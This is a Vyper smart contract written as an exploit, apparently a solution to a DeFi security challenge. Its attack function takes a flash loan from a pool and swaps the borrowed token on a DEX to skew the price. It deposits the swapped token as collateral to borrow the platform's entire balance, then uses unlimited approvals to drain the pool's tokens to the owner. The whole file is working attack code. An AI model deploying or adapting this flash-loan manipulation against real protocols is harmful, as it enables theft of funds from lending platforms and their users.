# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IPlatform: 
    def depositToken1(x: uint256): nonpayable
    def borrowToken0(x: uint256): nonpayable

interface IDEX:
    def token0() -> address: view
    def token1() -> address: view
    def swap(
        _from: address,
        _to: address,
        _amount: uint256,
    ) -> uint256: nonpayable

interface IPool:
    def flashLoan(borrower: address, data: Bytes[4]): nonpayable
    def withdraw(x: uint256): nonpayable

owner: immutable(address)
platform: immutable(IPlatform)
dex: immutable(IDEX)
pool: immutable(IPool)
token0: immutable(IERC20)
token1: immutable(IERC20)

@external
@payable
def __init__(_platform: IPlatform, _dex: IDEX, _pool: IPool):
    owner = msg.sender
    platform = _platform
    dex = _dex
    pool = _pool
    token0 = IERC20(dex.token0())
    token1 = IERC20(dex.token1())

@external
def attack():
    assert msg.sender == owner, "!owner"
    calldata: Bytes[4] = method_id("delegated_callback()")
    pool.flashLoan(self, calldata)
    token0.transferFrom(
        pool.address,
        msg.sender,
        token0.balanceOf(pool.address),
    )

@external
def delegated_callback():
    token0.approve(dex.address, max_value(uint256))
    isec_flashed: uint256 = token0.balanceOf(self)
    dex.swap(token0.address, token1.address, isec_flashed)

    token1.approve(platform.address, max_value(uint256))
    bor_swapped: uint256 = token1.balanceOf(self)
    platform.depositToken1(bor_swapped)

    isec_borrowed: uint256 = token0.balanceOf(platform.address)
    platform.borrowToken0(isec_borrowed)
    
    token0.approve(msg.sender, max_value(uint256))
